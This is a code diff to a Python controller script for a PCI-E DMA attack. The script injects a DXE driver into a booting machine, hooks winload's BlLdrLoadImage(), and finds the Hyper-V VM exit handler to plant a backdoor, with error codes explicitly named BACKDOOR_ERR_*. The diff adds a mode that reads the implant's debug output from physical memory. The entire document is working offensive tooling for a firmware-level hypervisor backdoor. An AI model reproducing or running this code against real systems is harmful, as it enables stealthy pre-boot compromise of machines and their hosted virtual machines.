@@ -7,14 +7,20 @@ from optparse import OptionParser
 from pcie_lib import *
 from uefi import *
 
-HV_INFO_ADDR = STATUS_ADDR - (8 * 5)
+# physical address of _HYPER_V_INFO structure
+HV_INFO_ADDR = STATUS_ADDR - (8 * 4)
+
+# debug messages buffer pointer address
+OUTPUT_ADDR = HV_INFO_ADDR - 8
+OUTPUT_SIZE = PAGE_SIZE
 
 # error codes
-BACKDOOR_ERR_WINLOAD                 = -1 # winload.efi not found
-BACKDOOR_ERR_BELOW_1MB_NOT_FOUND     = -2 # winload!HvlpBelow1MbPage not found
-BACKDOOR_ERR_BELOW_1MB_NOT_ALLOCATED = -3 # winload!HvlpBelow1MbPage not allocated
-BACKDOOR_ERR_TRANSFER_TO_HYPERVISOR  = -4 # winload!HvlpTransferToHypervisor() not found
-BACKDOOR_ERR_LOW_MEMORY_STUB         = -5 # winload!HvlpLowMemoryStub() not found
+BACKDOOR_ERR_UNKNOWN        = -1    # unkown error
+BACKDOOR_ERR_WINLOAD_IMAGE  = -2    # winload image not found
+BACKDOOR_ERR_WINLOAD_FUNC   = -3    # winload!BlLdrLoadImage() not found
+BACKDOOR_ERR_WINLOAD_HOOK   = -4    # winload hook error
+BACKDOOR_ERR_HYPER_V_IMAGE  = -5    # Hyper-V image not found
+BACKDOOR_ERR_HYPER_V_EXIT   = -6    # Hyper-V VM exit handler not found
 
 def main():
 
@@ -26,9 +32,38 @@ def main():
     parser.add_option('-s', '--system-table', dest = 'system_table', default = None,
         help = 'EFI_SYSTEM_TABLE address')
 
+    parser.add_option('-d', '--debug-output', dest = 'debug_output', default = False, action = 'store_true',
+        help = 'read DXE driver debug output')
+
     # parse command line
     options, _ = parser.parse_args()
     options.system_table = None if options.system_table is None else int(options.system_table, 16)
+
+    if options.debug_output:
+
+        # open device
+        dev = TransactionLayer()    
+
+        print('[+] PCI-E link with target is up')
+
+        # read debug output address
+        addr = dev.mem_read_8(OUTPUT_ADDR)
+
+        print('[+] Debug output buffer address is 0x%x' % addr)
+
+        # check for the sane address
+        if addr > 0x1000 and addr < 0x100000000 and (addr & 0xfff) == 0:
+
+            # read debug output
+            data = dev.mem_read(addr, OUTPUT_SIZE)
+
+            print('\n' + data.split('\0')[0])
+            return 0
+
+        else:
+
+            print('[!] Invalid address')
+            return -1        
 
     # inject DXE driver into the booting system
     dev = dxe_inject(payload = options.payload, system_table = options.system_table)
@@ -48,18 +83,18 @@ def main():
             time.sleep(1)
             continue
 
-        print('[+] DXE driver was executed')
+        print('[+] DXE driver was executed, you can read its debug messages by running this program with -d option')
 
         break
 
-    print('[+] Waiting for Hyper-V init...')
+    print('[+] Waiting for Hyper-V load...')
 
     dev.mem_write_8(HV_INFO_ADDR, 0)
 
     while True:
 
         # wait for hypervisor
-        status, winload_cr3, hv_cr3, hv_entry, hv_vmexit = unpack('qQQQQ', dev.mem_read(HV_INFO_ADDR, 8 * 5))
+        status, image_base, image_entry, vm_exit = unpack('qQQQ', dev.mem_read(HV_INFO_ADDR, 8 * 4))
 
         if status == 0:
 
@@ -67,41 +102,40 @@ def main():
             time.sleep(1)
             continue
 
-        if status == BACKDOOR_ERR_WINLOAD:
+        if status == BACKDOOR_ERR_WINLOAD_IMAGE:
 
             print('ERROR: DXE driver is unable to locate winload.efi')
             break
 
-        if status == BACKDOOR_ERR_BELOW_1MB_NOT_FOUND:
+        elif status == BACKDOOR_ERR_WINLOAD_FUNC:
 
-            print('ERROR: DXE driver is unable to locate winload!HvlpBelow1MbPage')
+            print('ERROR: DXE driver is unable to locate winload!BlLdrLoadImage()')
             break
 
-        if status == BACKDOOR_ERR_BELOW_1MB_NOT_ALLOCATED:
+        elif status == BACKDOOR_ERR_WINLOAD_HOOK:
 
-            print('ERROR: winload!HvlpBelow1MbPage is not allocated, Hyper-V wasn\'t started')
+            print('ERROR: DXE driver is unable to hook winload!BlLdrLoadImage()')
             break
 
-        if status == BACKDOOR_ERR_TRANSFER_TO_HYPERVISOR:
+        elif status == BACKDOOR_ERR_HYPER_V_IMAGE:
 
-            print('ERROR: DXE driver is unable to locate winload!HvlpTransferToHypervisor()')
+            print('ERROR: DXE driver is unable to locate Hyper-V image')
             break
 
-        if status == BACKDOOR_ERR_LOW_MEMORY_STUB:
+        elif status == BACKDOOR_ERR_HYPER_V_EXIT:
 
-            printf('ERROR: DXE driver is unable to locate winload!HvlpLowMemoryStub()')
+            print('ERROR: DXE driver is unable to locate Hyper-V VM exit handler')
             break
 
-        print('[+] Hyper-V image entry was executed\n')
-        print('              Winload CR3: 0x%.16x' % winload_cr3)
-        print('              Hyper-V CR3: 0x%.16x' % hv_cr3)
-        print('  Hyper-V VM exit handler: 0x%.16x' % hv_vmexit)
-        print('      Hyper-V image entry: 0x%.16x\n' % hv_entry)
+        elif status == BACKDOOR_ERR_UNKNOWN:
 
-        if hv_vmexit == 0:
+            print('ERROR: DXE driver returned unknown error')
+            break
 
-            print('ERROR: Unable to locate Hyper-V VM exit handler')
-
+        print('[+] Hyper-V image was loaded\n')
+        print('    Hyper-V image base: 0x%.16x' % image_base)
+        print('           Image entry: 0x%.16x' % image_entry)
+        print('       VM exit handler: 0x%.16x\n' % vm_exit)        
         break
 
     print('[+] DONE')
